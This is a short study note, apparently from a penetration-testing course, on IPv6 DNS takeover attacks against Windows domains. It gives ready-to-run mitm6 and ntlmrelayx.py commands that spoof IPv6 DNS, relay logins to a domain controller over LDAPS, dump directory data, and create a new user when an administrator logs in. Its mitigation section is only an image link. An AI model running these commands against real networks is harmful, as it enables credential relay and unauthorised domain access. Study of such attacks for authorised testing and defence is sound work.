---
tags:
  - PEH
---
## What is IPv6 Attacks?
Machines in a network utilize and use IPv4 for the most of the time, but some machines have IPv6 enabled (even if they don't use it). The question in this case is: Who is doing DNS for IPv6? The answer is NO BODY! The idea behind attack is to take advantage of this fact and spoof an IPv6 DNS server.

This attack is another for of relaying, but it's more efficient because it uses IPv6, the attack can CREATE USERS for use whenever an administrator level/domain admin logs in.
## Executing IPv6 Attacks
1. Setup the rogue IPv6 server using `ntlmrelayx.py`:
```bash
ntlmrelayx.py -6 -t ldaps://<dc-ip> -wh <any-name>.<domain-name>.local -l <any-name>
# !!! 
# -6 is for IPv6
# -t Target
# -wh is for the rogue WPAD server
# -l is for loot
```
2. Setup a MITM and listen for traffic
```bash
sudo mitm6 -d <domain-name>.local
```
- Normal level user logging in will utilize `ldapdomaindump` in the specified `-l <folder>`
- ==Administrator== level user logging in will CREATE A NEW USER FOR US !

>[!INFO] What is LDAP?
>LDAP(S) stands for Lightweight Directory Access Protocol (Secure), think of it as a small phonebook for the network. LDAP allows you to search for someone or something without knowing the location.
>
>LDAP(S) usually points to the domain controller.

>[!WARNING] Don't run this attack for too long
>Run this attack in sprints for no longer than 10mins/sprint! because your machine acts as an IPv6 DNS server and it may cause problems overtime.
## IPv6 Attacks mitigation
![[IPv6 Attacks mitigation.png]]